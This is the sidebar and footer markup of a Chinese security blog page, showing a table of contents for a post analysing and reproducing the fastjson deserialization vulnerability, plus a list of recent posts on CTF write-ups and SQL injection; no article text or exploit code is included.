class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Fxizenta</div><div class="author-info__description">no body know touch fish better than me</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Fxizenta"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/fxizenta" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:fxizenta14@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">fastjson反序列化漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">2.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86com-sun-rowset-JdbcRowSetImpl%E5%AD%98%E5%85%A5-mappings-%E4%B8%AD"><span class="toc-number">3.3.1.</span> <span class="toc-text">将com.sun.rowset.JdbcRowSetImpl存入 mappings 中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%AE%9E%E7%8E%B0RCE"><span class="toc-number">3.3.2.</span> <span class="toc-text">绕过并执行实现RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.3.3.</span> <span class="toc-text">JdbcRowSetImpl利用链</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">4.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">4.2.</span> <span class="toc-text">准备工作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA"><span class="toc-number">4.2.1.</span> <span class="toc-text">靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.2.</span> <span class="toc-text">目录服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87RMI%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">4.2.3.</span> <span class="toc-text">准备RMI服务器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">4.3.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#result"><span class="toc-number">4.4.</span> <span class="toc-text">result</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/05/29/fastjson/" title="fastjson反序列化漏洞分析与复现"><img src="/img/sea_and_city.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fastjson反序列化漏洞分析与复现"/></a><div class="content"><a class="title" href="/2021/05/29/fastjson/" title="fastjson反序列化漏洞分析与复现">fastjson反序列化漏洞分析与复现</a><time datetime="2021-05-29T13:21:06.000Z" title="发表于 2021-05-29 21:21:06">2021-05-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/18/ciscn2021/" title="2021ciscn_web_wp"><img src="/img/mountains2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021ciscn_web_wp"/></a><div class="content"><a class="title" href="/2021/05/18/ciscn2021/" title="2021ciscn_web_wp">2021ciscn_web_wp</a><time datetime="2021-05-18T01:07:07.000Z" title="发表于 2021-05-18 09:07:07">2021-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/06/same_source_and_cors/" title="同源策略和COTRS"><img src="/img/war.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="同源策略和COTRS"/></a><div class="content"><a class="title" href="/2021/05/06/same_source_and_cors/" title="同源策略和COTRS">同源策略和COTRS</a><time datetime="2021-05-06T12:07:07.000Z" title="发表于 2021-05-06 20:07:07">2021-05-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/17/sqli/" title="sql注入总结(补充更新中)"><img src="/img/mountains.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql注入总结(补充更新中)"/></a><div class="content"><a class="title" href="/2021/04/17/sqli/" title="sql注入总结(补充更新中)">sql注入总结(补充更新中)</a><time datetime="2021-04-17T08:52:02.000Z" title="发表于 2021-04-17 16:52:02">2021-04-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/06/2021hfctf-wp/" title="2021hfctf_wp"><img src="/img/house2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021hfctf_wp"/></a><div class="content"><a class="title" href="/2021/04/06/2021hfctf-wp/" title="2021hfctf_wp">2021hfctf_wp</a><time datetime="2021-04-06T11:52:50.000Z" title="发表于 2021-04-06 19:52:50">2021-04-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Fxizenta</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script></div></body></html>
